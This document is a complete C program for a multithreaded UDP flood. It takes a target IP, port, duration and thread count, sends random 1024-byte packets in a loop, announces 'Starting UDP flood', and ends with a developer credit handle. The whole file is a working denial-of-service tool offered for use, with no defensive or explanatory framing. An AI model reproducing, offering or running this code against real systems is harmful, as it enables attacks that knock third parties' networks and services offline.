#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PACKET_SIZE 1024

volatile sig_atomic_t running = 1;

typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
} flood_args_t;

void handle_signal(int sig) {
    running = 0;
}

void* flood_thread(void* args) {
    flood_args_t* fargs = (flood_args_t*)args;

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(fargs->port);
    inet_pton(AF_INET, fargs->ip, &target.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    uint8_t payload[PACKET_SIZE];
    for (int i = 0; i < PACKET_SIZE; i++) {
        payload[i] = rand() % 256;
    }

    while (running) {
        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    srand(time(NULL));
    signal(SIGINT, handle_signal);

    printf("Starting UDP flood on %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);

    pthread_t* thread_ids = malloc(threads * sizeof(pthread_t));
    flood_args_t args;
    strncpy(args.ip, ip, INET_ADDRSTRLEN);
    args.port = port;

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, flood_thread, &args);
    }

    sleep(duration);
    running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    printf("Flood completed.\n");
    printf("Developer: @Mafiaop0781\n");  // <-- Added this line
    return 0;
}